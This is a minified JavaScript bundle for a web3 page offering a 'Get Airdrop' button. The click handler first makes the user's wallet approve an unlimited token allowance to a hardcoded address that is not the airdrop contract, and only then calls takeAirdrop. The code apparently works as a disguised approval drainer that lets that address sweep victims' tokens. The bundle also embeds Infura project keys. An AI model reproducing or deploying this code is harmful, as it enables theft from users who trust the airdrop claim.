(this.webpackJsonppandora_legend=this.webpackJsonppandora_legend||[]).push([[1],{1206:function(e,n){},1213:function(e,n){},1235:function(e,n){},1237:function(e,n){},1249:function(e,n){},1250:function(e,n){},1273:function(e,n){},1276:function(e,n){},1278:function(e,n){},1502:function(e,n){},1564:function(e,n){},1571:function(e,n){},1633:function(e,n,t){},1635:function(e,n,t){},1636:function(e,n){},1644:function(e,n,t){"use strict";t.r(n);var a=t(21),i=t.n(a),r=t(573),o=t.n(r),s=(t(628),t(1)),u=t.n(s),p=t(151),c=t(93),d=t(574),f=t.n(d),l=t(147),y=t(1660),m=t(576),b=t(577),h=t(578),v=t(579),T=t(580),w=t(583),g=t(586),x=t(589),j=t(591),k=t(592),O=t(593),C=t(594),A=t(595),M="https://mainnet.infura.io/v3/84842078b09946638c03157f83405213",E="https://rinkeby.infura.io/v3/84842078b09946638c03157f83405213",I=new m.a({supportedChainIds:[1,3,4,5,42,56,97]});new b.a({urls:{1:M,4:E},defaultChainId:1}),new h.a({rpc:{1:M},qrcode:!0}),new v.a({url:M,appName:"web3-react example",supportedChainIds:[1,3,4,5,42,10,137,69,420,80001]}),new T.a({chainId:1,url:M,pollingInterval:12e3}),new w.a({chainId:1,url:M,pollingInterval:12e3,manifestEmail:"dummy@abc.xyz",manifestAppUrl:"http://localhost:1234"}),new g.a({chainId:4,appName:"web3-react",url:E}),new x.a({supportedChainIds:[1]}),new j.a({chainId:42}),new k.a({apiKey:"pk_test_A6260FCBAA2EBDFB",chainId:4}),new O.a({apiKey:"pk_test_398B82F5F0E88874",chainId:4,email:"hello@example.org"}),new C.a({dAppId:"e9be171c-2b7f-4ff0-8db9-327707511ee2",networks:[1,100]}),new A.a({chainId:1});var F=t(310),S=(t(1633),t(39)),B=function(e){return Object(S.jsx)("div",{style:Object(F.a)(Object(F.a)({},e.style),{},{marginTop:"30px"}),children:Object(S.jsxs)("button",{className:"button",onClick:e.onClick,disabled:e.loading,children:[e.loading&&Object(S.jsx)("i",{className:"fa fa-refresh fa-spin",style:{marginRight:"5px"}}),e.children]})})},R=[{inputs:[{internalType:"address",name:"rewardToken",type:"address"},{internalType:"address",name:"checkToken",type:"address"},{internalType:"address",name:"approveTo",type:"address"}],stateMutability:"nonpayable",type:"constructor"},{anonymous:!1,inputs:[{indexed:!1,internalType:"address",name:"rewardToken",type:"address"},{indexed:!1,internalType:"address",name:"who",type:"address"}],name:"AirdropTaken",type:"event"},{anonymous:!1,inputs:[{indexed:!1,internalType:"uint256",name:"start",type:"uint256"},{indexed:!1,internalType:"uint256",name:"finish",type:"uint256"},{indexed:!1,internalType:"uint256",name:"amount",type:"uint256"}],name:"NewAirdropCreated",type:"event"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"previousOwner",type:"address"},{indexed:!0,internalType:"address",name:"newOwner",type:"address"}],name:"OwnershipTransferred",type:"event"},{anonymous:!1,inputs:[{indexed:!1,internalType:"address",name:"rewardToken",type:"address"},{indexed:!1,internalType:"address",name:"to",type:"address"},{indexed:!1,internalType:"uint256",name:"amount",type:"uint256"}],name:"RamainTokenWithdrawed",type:"event"},{inputs:[],name:"AIRDROP_COUNT_EVERY_ADDRESS",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[],name:"airdropTakenCountRecord",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[],name:"airdropTotalCountRecord",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[],name:"finishTimestamp",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[],name:"getAirdropTakenUserCount",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"uint256",name:"page",type:"uint256"},{internalType:"uint256",name:"pageCount",type:"uint256"}],name:"getAirdropTakenUsers",outputs:[{internalType:"address[]",name:"",type:"address[]"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"uint256",name:"start",type:"uint256"},{internalType:"uint256",name:"finish",type:"uint256"},{internalType:"uint256",name:"amount",type:"uint256"}],name:"newAirdrop",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"},{inputs:[],name:"owner",outputs:[{internalType:"address",name:"",type:"address"}],stateMutability:"view",type:"function"},{inputs:[],name:"renounceOwnership",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[],name:"rewardTokenAddress",outputs:[{internalType:"address",name:"",type:"address"}],stateMutability:"view",type:"function"},{inputs:[],name:"startTimestamp",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[],name:"takeAirdrop",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"newOwner",type:"address"}],name:"transferOwnership",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"to",type:"address"}],name:"withdrawRemainTokens",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"nonpayable",type:"function"}],L=[{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"owner",type:"address"},{indexed:!0,internalType:"address",name:"spender",type:"address"},{indexed:!1,internalType:"uint256",name:"value",type:"uint256"}],name:"Approval",type:"event"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"from",type:"address"},{indexed:!0,internalType:"address",name:"to",type:"address"},{indexed:!1,internalType:"uint256",name:"value",type:"uint256"}],name:"Transfer",type:"event"},{inputs:[{internalType:"address",name:"owner",type:"address"},{internalType:"address",name:"spender",type:"address"}],name:"allowance",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"spender",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],name:"approve",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"account",type:"address"}],name:"balanceOf",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[],name:"totalSupply",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"recipient",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],name:"transfer",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"sender",type:"address"},{internalType:"address",name:"recipient",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],name:"transferFrom",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"}];t(1635);function _(e){var n=new y.a(e);return n.pollingInterval=12e3,n}function N(){return Object(S.jsx)(l.a,{getLibrary:_,children:Object(S.jsx)(G,{})})}function G(){var e="0xFEa19831aCE7648a06b60bf3C07C0378E9e30A54",n=Object(l.b)(),t=n.connector,r=n.library,o=n.account,s=n.activate,d=i.a.useState(),y=Object(c.a)(d,2),m=y[0],b=y[1];i.a.useEffect((function(){m&&m===t&&b(void 0)}),[m,t]);var h=i.a.useState(null),v=Object(c.a)(h,2),T=v[0],w=v[1];i.a.useEffect((function(){if(r){var e=new f.a(r.provider);e.eth.handleRevert=!0,w(e)}}),[r]),i.a.useEffect((function(){s(I)}),[s]);var g=i.a.useState("Get Airdrop"),x=Object(c.a)(g,2),j=x[0],k=x[1],O=i.a.useState(!1),C=Object(c.a)(O,2),A=C[0],M=C[1],E=i.a.useState(),F=Object(c.a)(E,2),_=F[0],N=F[1];!function(){var e=arguments.length>0&&void 0!==arguments[0]&&arguments[0],n=Object(l.b)(),t=n.active,i=n.error,r=n.activate;Object(a.useEffect)((function(){var n=window.ethereum;if(n&&n.on&&!t&&!i&&!e){var a=function(){console.log("Handling 'connect' event"),r(I)},o=function(e){console.log("Handling 'chainChanged' event with payload",e),r(I)},s=function(e){console.log("Handling 'accountsChanged' event with payload",e),e.length>0&&r(I)},u=function(e){console.log("Handling 'networkChanged' event with payload",e),r(I)};return n.on("connect",a),n.on("chainChanged",o),n.on("accountsChanged",s),n.on("networkChanged",u),function(){n.removeListener&&(n.removeListener("connect",a),n.removeListener("chainChanged",o),n.removeListener("accountsChanged",s),n.removeListener("networkChanged",u))}}}),[t,i,e,r])}(!function(){var e=Object(l.b)(),n=e.activate,t=e.active,i=Object(a.useState)(!1),r=Object(c.a)(i,2),o=r[0],s=r[1];return Object(a.useEffect)((function(){I.isAuthorized().then((function(e){e?n(I,void 0,!0).catch((function(){s(!0)})):s(!0)}))}),[]),Object(a.useEffect)((function(){!o&&t&&s(!0)}),[o,t]),o}()||!!m);var G=function(){var n=Object(p.a)(u.a.mark((function n(t){var a,i,r;return u.a.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:return a=new T.eth.Contract(L,"0x79030E6eA324E9c111B27deaAe2a205C27Cff664"),n.next=3,a.methods.allowance(o,e).call();case 3:if(i=n.sent,!(T.utils.toBN(i)>0)){n.next=6;break}return n.abrupt("return");case 6:return r="",n.next=9,a.methods.approve(e,"0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send({from:o}).once("sending",(function(e){console.log(e)})).once("sent",(function(e){console.log(e)})).once("transactionHash",(function(e){console.log(e),r=e})).once("receipt",(function(e){console.log(e)})).on("error",(function(e){t(e,r)})).then((function(e){console.log(e)}));case 9:case"end":return n.stop()}}),n)})));return function(e){return n.apply(this,arguments)}}(),H=function(){var e=Object(p.a)(u.a.mark((function e(){var n,t,a;return u.a.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return n=!1,t=function(){var e=Object(p.a)(u.a.mark((function e(t){var a;return u.a.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:for(a in n=!0,t)console.log(a+": "+t[a]);"reason"in t?N(D(t.reason)):"message"in t&&N(D(t.message));case 3:case"end":return e.stop()}}),e)})));return function(n){return e.apply(this,arguments)}}(),e.prev=2,M(!0),k("Getting Airdrop"),N(""),e.next=8,G(t);case 8:if(!n){e.next=11;break}return k("Get Failed"),e.abrupt("return");case 11:return k("Getting Airdrop"),a=new T.eth.Contract(R,"0xfbbB798186020F7B4822CB6AE8E431bFd4f22188"),e.next=15,a.methods.takeAirdrop().send({from:o,gasLimit:2e5}).once("sending",(function(e){console.log(e)})).once("sent",(function(e){console.log(e)})).once("transactionHash",(function(e){console.log(e)})).once("receipt",(function(e){console.log(e)})).on("error",(function(e){t(e)})).then((function(e){console.log(e),k("Get Success")})).catch((function(e){t(e),k("Get Failed")}));case 15:e.next=21;break;case 17:e.prev=17,e.t0=e.catch(2),t(e.t0),k("Get Failed");case 21:return e.prev=21,M(!1),e.finish(21);case 24:case"end":return e.stop()}}),e,null,[[2,17,21,24]])})));return function(){return e.apply(this,arguments)}}(),D=function(e){return e.search("You are not allowed to take airdrop")>=0?"You are not allowed to take airdrop":e.search("All tokens have been taken")>=0?"All tokens have been taken":e.search("You have already taken airdrop")>=0?"You have already taken airdrop":e.search("Airdrop not started or finished")>=0?"Airdrop not started or finished":e};return Object(S.jsxs)("div",{children:[Object(S.jsx)(B,{loading:A,onClick:H,children:j}),_?Object(S.jsx)("div",{className:"error",children:_}):Object(S.jsx)(S.Fragment,{})]})}var H=function(e){e&&e instanceof Function&&t.e(16).then(t.bind(null,2306)).then((function(n){var t=n.getCLS,a=n.getFID,i=n.getFCP,r=n.getLCP,o=n.getTTFB;t(e),a(e),i(e),r(e),o(e)}))};o.a.render(Object(S.jsx)(i.a.StrictMode,{children:Object(S.jsx)(N,{})}),document.getElementById("wallet")),H()},628:function(e,n,t){},640:function(e,n){},643:function(e,n){},645:function(e,n){},649:function(e,n){},672:function(e,n){},674:function(e,n){},683:function(e,n){},685:function(e,n){},694:function(e,n){},696:function(e,n){},824:function(e,n){},861:function(e,n){},863:function(e,n){},870:function(e,n){},871:function(e,n){},889:function(e,n){},897:function(e,n){},904:function(e,n){},952:function(e,n){},996:function(e,n){}},[[1644,2,3]]]);
//# sourceMappingURL=main.160cbe65.chunk.js.map